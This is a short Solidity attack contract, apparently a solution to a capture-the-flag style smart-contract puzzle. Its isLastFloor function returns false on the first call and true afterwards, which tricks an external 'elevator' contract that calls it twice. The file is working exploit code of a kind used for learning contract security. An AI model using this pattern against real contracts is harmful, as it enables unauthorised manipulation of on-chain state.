// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TheBuilding {
    bool called;

    function isLastFloor(uint) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    function goTo(address elevator, uint _floor) external {
        elevator.call(abi.encodeWithSignature("goTo(uint256)", _floor));
    }
}
